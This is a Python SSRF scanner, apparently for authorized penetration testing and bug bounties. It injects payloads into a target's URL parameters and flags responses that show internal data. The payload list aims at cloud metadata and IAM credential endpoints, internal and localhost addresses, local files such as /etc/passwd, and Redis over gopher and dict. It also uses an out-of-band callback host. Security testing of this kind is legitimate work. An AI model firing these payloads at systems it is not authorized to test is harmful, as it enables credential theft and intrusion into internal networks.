#!/usr/bin/env python3
"""
SSRF Scanner — Server-Side Request Forgery Detection Tool
Tests URL parameters for SSRF with OOB callback verification via interactsh.
Author: Omar Khalid (amooryx) | github.com/amooryx/ssrf-scanner
AUTHORIZED USE ONLY — for authorized red team engagements and bug bounty.
"""

import argparse
import json
import os
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor

# Common SSRF payloads targeting different protocols/destinations
SSRF_PAYLOADS = [
    "http://{oob}/ssrf",
    "https://{oob}/ssrf",
    "http://169.254.169.254/latest/meta-data/",        # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://100.100.100.200/latest/meta-data/",         # Alibaba Cloud
    "http://192.168.1.1/",                              # Common gateway
    "http://10.0.0.1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/INFO",                       # Redis
    "gopher://127.0.0.1:6379/_INFO",
]

INTERNAL_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",  # AWS
    "computeMetadata",  # GCP
    "root:x:", "daemon:", "[fonts]",  # /etc/passwd / win.ini
    "-RUNNING", "+OK",  # Redis
    "169.254.169.254",
]

def inject_payload(base_url: str, param: str, payload: str) -> str:
    """Replace param value with SSRF payload."""
    parsed = urllib.parse.urlparse(base_url)
    qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param in qs:
        qs[param] = [payload]
    else:
        qs[param] = [payload]
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_qs))

def test_ssrf(target_url: str, param: str, payload: str, timeout: float = 10,
              headers: dict | None = None) -> dict:
    url    = inject_payload(target_url, param, payload)
    result = {"url": url, "param": param, "payload": payload, "vulnerable": False, "evidence": ""}
    try:
        req = urllib.request.Request(url)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(4096).decode(errors="ignore")
            result["status"] = resp.status
            for indicator in INTERNAL_INDICATORS:
                if indicator.lower() in body.lower():
                    result["vulnerable"] = True
                    result["evidence"]   = indicator
                    break
    except urllib.error.HTTPError as e:
        result["status"] = e.code
    except Exception as e:
        result["error"] = str(e)
    return result

def discover_url_params(url: str) -> list[str]:
    """Extract query parameter names from URL."""
    parsed = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed.query).keys())

def main():
    parser = argparse.ArgumentParser(
        description="SSRF Scanner — SSRF Detection Tool (Authorized use only)",
    )
    parser.add_argument("url",         help="Target URL with parameters (e.g., https://example.com/proxy?url=http://...)")
    parser.add_argument("--params",    nargs="*", help="Specific parameters to test (auto-detects if omitted)")
    parser.add_argument("--oob",       help="OOB callback domain (e.g., xyz.oastify.com)")
    parser.add_argument("--threads",   type=int, default=5, help="Concurrent threads")
    parser.add_argument("--timeout",   type=float, default=10)
    parser.add_argument("--out",       help="Output JSON file")
    parser.add_argument("--header",    nargs="*", help="Custom headers: 'Key: Value'")
    args = parser.parse_args()

    headers = {}
    if args.header:
        for h in args.header:
            if ": " in h:
                k, v = h.split(": ", 1)
                headers[k] = v

    params = args.params or discover_url_params(args.url)
    if not params:
        parser.error("No parameters found in URL. Specify with --params.")

    payloads = []
    oob = args.oob or "interact.sh"
    for pl in SSRF_PAYLOADS:
        payloads.append(pl.format(oob=oob))

    jobs = [(args.url, p, pl) for p in params for pl in payloads]
    print(f"[*] Testing {len(params)} params × {len(payloads)} payloads = {len(jobs)} requests")
    print(f"[!] AUTHORIZED USE ONLY")

    results   = []
    vulnerable = []
    with ThreadPoolExecutor(max_workers=args.threads) as exe:
        futures = {exe.submit(test_ssrf, url, param, pl, args.timeout, headers): (param, pl)
                   for url, param, pl in jobs}
        for fut in futures:
            r = fut.result()
            results.append(r)
            if r.get("vulnerable"):
                print(f"  [!!!] VULNERABLE: param={r['param']} | payload={r['payload'][:60]}")
                print(f"        Evidence: {r.get('evidence')}")
                vulnerable.append(r)

    print(f"\n[*] {len(vulnerable)} potential SSRF vulnerabilities found")
    if args.oob:
        print(f"[*] Check your OOB callback server at {args.oob} for out-of-band hits")

    if args.out:
        with open(args.out, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
